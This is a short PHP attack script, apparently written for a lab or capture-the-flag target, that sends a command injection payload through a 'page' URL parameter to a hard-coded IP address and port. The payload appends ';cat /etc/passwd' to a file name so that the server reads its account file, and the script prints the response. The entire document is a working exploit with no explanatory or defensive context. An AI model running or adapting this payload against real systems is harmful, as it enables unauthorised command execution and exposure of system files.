<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Target URL where the 'page' parameter might be vulnerable
$target_url = "http://94.237.59.63:57569/index.php";

// Command injection payload
$payload = "somefile;cat /etc/passwd";

// Construct the full URL with the injected payload
$full_url = $target_url . "?page=" . urlencode($payload);

// Send the GET request to the server and handle errors
$response = @file_get_contents($full_url);

// Check if there was an error in retrieving the URL
if ($response === FALSE) {
    echo "Error: Unable to retrieve the URL. Please check the URL and try again.";
} else {
    // Output the response from the server
    echo "Response from server:\n";
    echo htmlspecialchars($response); // Use htmlspecialchars to prevent XSS
}
?>
